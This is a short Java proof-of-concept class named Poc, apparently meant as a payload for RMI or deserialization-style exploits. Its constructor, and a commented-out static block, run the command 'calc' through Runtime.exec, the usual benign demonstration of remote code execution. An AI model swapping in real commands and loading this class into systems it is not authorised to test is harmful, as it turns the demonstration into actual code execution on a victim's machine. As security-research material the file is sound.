/**
 * Created by IntelliJ IDEA.
 * User: tridentj
 * Date: 2021/8/20
 * Time: 14:27
 **/
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;

public class Poc extends UnicastRemoteObject{
    
    public Poc() throws RemoteException{
        try {
            Runtime.getRuntime().exec("calc");
        } catch (Exception e) {
            //
        }
    }
    /*
    static {
        try {
            Runtime rt = Runtime.getRuntime();
            Process pc = rt.exec("calc");
            pc.waitFor();
        } catch (Exception e) {
            // do nothing
        }
    }
    */
    public static void main(String[] args){
        try {
            Poc poc = new Poc();
        }catch (Exception e){
            e.printStackTrace();
        }
        
    }
}
